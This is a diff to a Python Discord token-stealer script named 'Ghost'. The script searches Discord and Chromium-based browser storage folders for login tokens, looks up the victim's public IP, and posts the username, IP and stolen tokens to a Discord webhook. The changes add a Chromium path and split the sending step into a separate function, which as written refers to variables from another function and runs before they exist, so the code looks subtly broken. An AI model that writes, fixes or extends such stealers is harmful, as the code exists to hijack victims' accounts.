@@ -1,6 +1,11 @@
-import requests, os, re, subprocess, sys, shutil, string, random
+import requests, os, re, sys, shutil, string, winreg
+
+
 from dhooks import Webhook, Embed
-from winreg import *
+
+
+#by @ytsix
+
 
 def GhostExt(path):
     path += '\\Local Storage\\leveldb'
@@ -35,6 +40,7 @@ def GhostInf():
 
 
 def GhostProc():
+
     hook = Webhook("")
     user = os.getenv("UserName")
     hostname = requests.get("https://api.ipify.org").text 
@@ -45,11 +51,11 @@ def GhostProc():
         'Discord Canary': roaming + '\\discordcanary',
         'Discord PTB': roaming + '\\discordptb',
         'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Google Chromium': local + '\\Chromium\\User Data\\Default',
         'Google Chrome Canary': local + '\\Google\\Chrome SxS\\User Data\\Default',
         'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
         'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-        'Chromium': local + '\\Chromium\\User Data\\Default',
 
     }
 
@@ -69,11 +75,17 @@ def GhostProc():
             pass
 
         message += '```'
+     
 
 
-        embed = Embed(title=f' [ New Client Logged -> | {user} | {hostname} ] ',color=16764108)
-        embed.add_field("Found Tokens:",message)
-        hook.send(embed=embed)
-        
+def GhostSend():
+
+    embed = Embed(title=f' [ Ghost Scraped -> | {user} | {hostname} ] ',color=16764108)
+    embed.add_field("Goods =>",message)
+    hook.send(embed=embed)
+
+
+
+GhostSend()        
 GhostProc()
 GhostInf()
